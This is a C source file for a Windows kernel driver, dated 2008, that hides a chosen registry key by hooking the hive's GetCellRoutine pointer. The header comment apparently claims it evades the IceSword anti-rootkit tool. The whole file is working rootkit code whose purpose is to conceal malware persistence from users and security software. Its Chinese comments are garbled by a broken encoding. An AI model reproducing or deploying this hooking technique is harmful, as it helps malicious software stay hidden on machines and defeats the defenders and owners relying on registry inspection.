/******************************************************************************
**
**  FileName    :   HideRegKey.c
**  Version     :   0.10
**  Author      :   embedlinux(E-mai:hqulyc@126.com QQ:5054-3533)
**  Date        :   2008-08-04
**  Comment     :   һ������ע�������������룬���Թ�Ŀǰ���µ�IceSword1.22
**
******************************************************************************/

#include "HideRegKey.h"

//����ȫ�ֱ���
PGET_CELL_ROUTINE  OrigGetCellRoutine = NULL;
PGET_CELL_ROUTINE *OrigGetCellRoutineAddr = NULL;
PCM_KEY_NODE   g_HideNode = NULL;
PCM_KEY_NODE   g_LastNode = NULL;

//��ָ�����ֵ�Key
HANDLE OpenKeyByName(PCWSTR pwcsKeyName)
{
   NTSTATUS ntStatus;
   UNICODE_STRING KeyNameUnicodeString;
   OBJECT_ATTRIBUTES ObjectAttributes;
   HANDLE hKey;

   RtlInitUnicodeString(&KeyNameUnicodeString, pwcsKeyName);
   InitializeObjectAttributes(
       &ObjectAttributes, 
       &KeyNameUnicodeString, 
       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
       NULL,  //RootDirectory
       NULL); //SecurityDescriptor
   
   //Opens an existing registry key.
   //ntStatus = ZwOpenKey(&hKey, KEY_READ, &ObjectAttributes);
   ntStatus = ZwCreateKey(
       &hKey, 
       KEY_READ, 
       &ObjectAttributes,
       0,
       NULL,
       REG_OPTION_NON_VOLATILE,
       NULL);
   if ( !NT_SUCCESS(ntStatus) )
   {
      //������Ҫ�޸�
      DbgPrint("ZwCreateKey Failed: %lx\n", ntStatus);
      return NULL;
   }
   return hKey;
}

//��ȡָ��Key�����KeyControlBlock
PVOID GetKeyControlBlock(HANDLE hKey)
{
   NTSTATUS ntStatus;
   PCM_KEY_BODY pKeyBody;
   PVOID KeyControlBlock;

   if (hKey == NULL) 
   	  return NULL;

   // ��Key�����ȡ������
   ntStatus = ObReferenceObjectByHandle(hKey, 
       KEY_READ,   //DesiredAccess
       NULL,       //ObjectType
       KernelMode, //AccessMode
       &pKeyBody, 
       NULL);
   if (!NT_SUCCESS(ntStatus))
   {
      DbgPrint("ObReferenceObjectByHandle Failed: %lx\n",ntStatus);
      return NULL;
   }

   // �������к���KeyControlBlock
   KeyControlBlock = pKeyBody->KeyControlBlock;
   KdPrint(("KeyControlBlock = %lx\n", KeyControlBlock));

   ObDereferenceObject(pKeyBody);

   return KeyControlBlock;
}

//��ȡ���������һ���Ӽ��Ľڵ�(���ÿ�����)
PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
   //��ȡ�����Ľڵ�
   PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)OrigGetCellRoutine(
                             Hive, Node->Parent);
   //��ȡ�Ӽ�������
   PCM_KEY_INDEX Index = (PCM_KEY_INDEX)OrigGetCellRoutine(
                  Hive, ParentNode->SubKeyLists[0]);

   KdPrint(("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index));

   // ���Ϊ��(����)��������ȡ���һ������
   if (Index->Signature == CM_KEY_INDEX_ROOT)
   {
      Index = (PCM_KEY_INDEX)OrigGetCellRoutine(Hive, Index->List[Index->Count-1]);
      
      KdPrint(("Index = %lx\n", Index));
   }

   if ( Index->Signature == CM_KEY_FAST_LEAF || 
   	    Index->Signature == CM_KEY_HASH_LEAF)
   {
      //����Ҷ����(2k)��ɢ��Ҷ����(XP/2k3)���������Ľڵ�
      return OrigGetCellRoutine(Hive, Index->List[2*(Index->Count-1)]);
   }
   else
   {
      //һ��Ҷ�������������Ľڵ�
      return OrigGetCellRoutine(Hive, Index->List[Index->Count-1]);
   }
}

//GetCell���̵Ĺ��Ӻ���
PVOID HookGetCellRoutine(PVOID Hive, HANDLE Cell)
{
   // ����ԭ����
   PVOID pRet = OrigGetCellRoutine(Hive, Cell);
   if (pRet)
   {
      // ���ص�����Ҫ���صĽڵ�
      if (pRet == g_HideNode)
      {
         KdPrint(("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet));
         //��ѯ�����沢�����丸�������һ���Ӽ��Ľڵ�
         pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(
                              Hive, g_HideNode);
         KdPrint(("g_LastNode = %lx\n", g_LastNode));
         //���ص��������һ���ڵ㣬���ؿ�ֵ
         if (pRet == g_HideNode) 
             pRet = NULL;
      }
      // ���ص�����ǰ��������һ����
      else if (pRet == g_LastNode)
      {
         KdPrint(("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet));
         // ��ձ���ֵ�������ؿ�ֵ
         pRet = g_LastNode = NULL;
      }
   }
   return pRet;
}

VOID UnHideRegKey()
{
	 if (OrigGetCellRoutineAddr) 
      *OrigGetCellRoutineAddr = OrigGetCellRoutine;
      
   KdPrint(("UnHideRegKey\n"));
}

//����ָ����ע����
NTSTATUS HideRegKey(IN PWCHAR HideKeyName)
{
   ULONG BuildNumber;
   ULONG KeyHiveOffset; //KeyControlBlock->KeyHive
   ULONG KeyCellOffset; //KeyControlBlock->KeyCell
   HANDLE hKey;
   PVOID KCB, Hive;

   // ��ѯBuildNumber
   if (PsGetVersion(NULL, NULL, &BuildNumber, NULL)) 
      return STATUS_NOT_SUPPORTED;
      
   KdPrint(("BuildNumber = %d\n", BuildNumber));

   //KeyControlBlock�ṹ���汾���в�ͬ
   //Cell��ֵһ��С��0x80000000����Hive���෴���Դ����ж�Ҳ����
   switch (BuildNumber)
   {
   case 2195: // Win2000
      KeyHiveOffset = 0xc;
      KeyCellOffset = 0x10;
      break;
   case 2600: // WinXP
   case 3790: // Win2003
      KeyHiveOffset = 0x10;
      KeyCellOffset = 0x14;
      break;
   case 7600:	//Win7 Undone
	  KeyHiveOffset = 0x10;
      KeyCellOffset = 0x14;
      break;
   default:
      return STATUS_NOT_SUPPORTED;
      break;
   }

   //�������صļ�
   hKey = OpenKeyByName(HideKeyName);
   //��ȡ�ü���KeyControlBlock
   KCB = GetKeyControlBlock(hKey);
   if (KCB)
   {
      //��KCB�õ�Hive
      PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
      
      //GetCellRoutine��KCB�У�����ԭ��ַ
      OrigGetCellRoutineAddr = &Hive->GetCellRoutine;
      OrigGetCellRoutine     = Hive->GetCellRoutine;
      KdPrint(("GetCellRoutine = %lx\n", OrigGetCellRoutine));
      
      //��ȡ�����صĽڵ㲢����
      g_HideNode = (PCM_KEY_NODE)OrigGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
      //�ҹ�GetCell����
      
      //InterlockedExchange(&Hive->GetCellRoutine, &HookGetCellRoutine);
      Hive->GetCellRoutine = HookGetCellRoutine;
   }
   ZwClose(hKey);
   
   return STATUS_SUCCESS;
}
